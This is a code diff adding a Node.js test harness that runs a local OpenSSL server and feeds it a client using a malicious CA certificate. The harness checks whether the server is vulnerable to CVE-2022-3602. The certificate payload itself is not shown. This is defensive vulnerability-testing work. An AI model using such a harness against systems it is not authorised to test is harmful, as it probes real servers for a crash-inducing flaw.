@@ -1,3 +1,6 @@
+import { execFile } from "node:child_process";
+import { promisify } from "node:util";
+
 /**
  * @typedef {object} RunLogs Result from a {@link OpenSSLTestCase} run.
  * @property {object} client - OpenSSL client logs.
@@ -23,6 +26,120 @@ export class OpenSSLTestCase {
    */
   static async run() {
     throw new Error("Unimplemented");
+  }
+}
+
+/**
+ * Runs the OpenSSL test case on the local machine with the default OpenSSL
+ * binary (if it's installed).
+ */
+export class LocalHostTestCase extends OpenSSLTestCase {
+  /**
+   * @inheritdoc
+   */
+  static async run() {
+    const port = 31050;
+
+    const timeout = 10_000;
+
+    const abortController = new AbortController();
+    try {
+      console.info(`Running OpenSSL server on port ${port}`);
+
+      const serverProcess = promisify(execFile)(
+        "openssl",
+        [
+          "s_server",
+          "-accept",
+          port,
+          "-CAfile",
+          "certs/cacert.pem",
+          "-cert",
+          "certs/server.cert.pem",
+          "-key",
+          "certs/server.key.pem",
+          "-state",
+          "-verify",
+          1,
+        ],
+        {
+          signal: abortController.signal,
+        }
+      );
+
+      // wait for OpenSSL server to start listening
+      await Promise.race([promisify(setTimeout)(2000), serverProcess]);
+
+      console.info(`Running OpenSSL malicious client payload on port ${port}`);
+
+      const clientProcess = promisify(execFile)("openssl", [
+        "s_client",
+        "-connect",
+        `127.0.0.1:${port}`,
+        "-key",
+        "certs/client.key.pem",
+        "-cert",
+        "certs/client.cert.pem",
+        "-CAfile",
+        "certs/malicious-client-cacert.pem",
+        "-state",
+      ]);
+
+      await Promise.race([
+        promisify(setTimeout)(timeout),
+        serverProcess,
+        clientProcess,
+      ]);
+
+      console.info(
+        `Both server and client are alive after ${timeout}ms, server is not vulnerable to CVE-2022-3602!`
+      );
+
+      console.info("Killing client with SIGINT (CTRL+C)");
+      clientProcess.child.kill("SIGINT");
+      serverProcess.child.kill("SIGINT");
+
+      let clientOutput;
+      try {
+        clientOutput = await clientProcess;
+      } catch (error) {
+        if (error.signal !== "SIGINT") {
+          throw error;
+        }
+
+        clientOutput = {
+          stdout: error.stdout,
+          stderr: error.stderr,
+        };
+      }
+
+      let serverOutput;
+      try {
+        serverOutput = await serverProcess;
+      } catch (error) {
+        if (error.signal !== "SIGINT") {
+          throw error;
+        }
+
+        serverOutput = {
+          stdout: error.stdout,
+          stderr: error.stderr,
+        };
+      }
+
+      return /** @type {RunLogs} */ ({
+        client: clientOutput,
+        server: {
+          ...serverOutput,
+          exitCode: serverProcess.child.exitCode || 0x82 /* Killed by SIGINT */,
+        },
+      });
+    } catch (error) {
+      abortController.abort(error);
+      throw error;
+    } finally {
+      abortController.abort(new Error("THIS SHOULD NEVER HAPPEN!!!!"));
+    }
   }
 }
 
